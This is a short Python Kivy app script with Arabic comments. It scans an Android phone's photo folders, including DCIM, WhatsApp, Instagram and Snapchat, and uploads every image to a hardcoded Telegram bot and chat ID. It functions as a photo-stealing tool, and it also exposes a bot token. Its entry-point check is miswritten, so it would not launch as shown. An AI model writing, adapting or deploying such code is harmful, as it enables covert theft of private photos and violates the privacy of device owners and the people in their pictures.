import os
import telebot
from concurrent.futures import ThreadPoolExecutor
import time
from kivy.app import App
from kivy.uix.button import Button
from kivy.uix.boxlayout import BoxLayout
from kivy.clock import Clock

bot = telebot.TeleBot("7588794919:AAE3govxYGAUPmJP7id1vsy96Vf3C6iKo3Q")

directories = [
    "/storage/emulated/0/DCIM/",
    "/storage/emulated/0/Pictures/",
    "/storage/emulated/0/WhatsApp/Media/WhatsApp Images/",
    "/storage/emulated/0/Instagram/",
    "/storage/emulated/0/Snapchat/",
]

supported_image_extensions = {".jpg", ".jpeg", ".png", ".webp", ".gif"}

def send_file(file_path):
    try:
        if any(file_path.lower().endswith(ext) for ext in supported_image_extensions):
            with open(file_path, "rb") as f:
                bot.send_photo(chat_id="925476653", photo=f)
                print(f"تم إرسال الصورة: {file_path}")
                time.sleep(1)
        else:
            print(f"الملف {file_path} ليس صورة مدعومة.")
    except Exception as e:
        print(f"حدث خطأ أثناء إرسال {file_path}: {e}")

def send_images_from_directory(directory):
    with ThreadPoolExecutor(max_workers=10) as executor:
        for root, dirs, files in os.walk(directory):
            for file in files:
                file_path = os.path.join(root, file)
                executor.submit(send_file, file_path)

class MyApp(App):
    def build(self):
        layout = BoxLayout(orientation='vertical')
        send_button = Button(text="إرسال الصور", on_press=self.send_images)
        layout.add_widget(send_button)
        return layout

    def send_images(self, instance):
        # استخدام Clock.schedule_once لتشغيل الوظيفة في الخيط الرئيسي
        Clock.schedule_once(self._send_images, 0)

    def _send_images(self, dt):
        for directory in directories:
            if os.path.exists(directory):
                send_images_from_directory(directory)
            else:
                print(f"المجلد {directory} غير موجود.")
if __name__ == 'main':
    # تأكد من أن التطبيق يعمل باستخدام name
    MyApp().run()
